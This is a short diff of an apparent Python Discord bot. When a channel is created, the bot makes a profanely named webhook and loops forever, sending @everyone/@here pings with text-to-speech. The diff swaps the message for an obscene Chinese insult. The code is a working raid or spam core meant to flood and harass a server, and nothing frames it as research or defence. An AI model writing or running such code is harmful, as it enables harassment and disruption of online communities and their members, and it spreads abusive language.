@@ -46,7 +46,7 @@ async def on_guild_channel_create(channel):
   
     webhook = await channel.create_webhook(name="幹垃圾群組")
     while True:
-        await channel.send(f"@everyone@here\n{message}",tts=True)
-        await webhook.send(f"@everyone@here\n{message}",tts=True)
+        await channel.send(f"@everyone@here\n吃我雞巴",tts=True)
+        await webhook.send(f"@everyone@here\n吃我雞巴",tts=True)
 
 bot.run(token)
